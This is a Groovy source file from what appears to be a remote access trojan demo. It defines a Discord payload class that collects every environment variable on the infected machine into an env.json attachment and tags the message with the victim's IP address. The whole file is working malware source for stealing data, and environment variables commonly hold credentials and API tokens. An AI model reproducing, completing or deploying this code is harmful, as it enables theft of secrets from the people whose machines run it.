package de.tudbut.ttd.ratdemo.discord.impl


import de.tudbut.ttd.ratdemo.Util
import de.tudbut.ttd.ratdemo.discord.DiscordPayload
import tudbut.parsing.JSON
import tudbut.parsing.TCN

class DEnvPayload implements DiscordPayload {

    @Override
    String getAttachmentName() {
        return 'env.json'
    }

    @Override
    byte[] getAttachment() {
        TCN env = new TCN()
        System.getenv().collect {
            env.set(it.key, it.value)
        }
        return JSON.writeReadable(env).getBytes('ISO-8859-1')
    }

    @Override
    TCN getContent() {
        TCN content = new TCN()
        content.set('username', Util.IP)
        content.set('content', 'Env')
        return content
    }
}
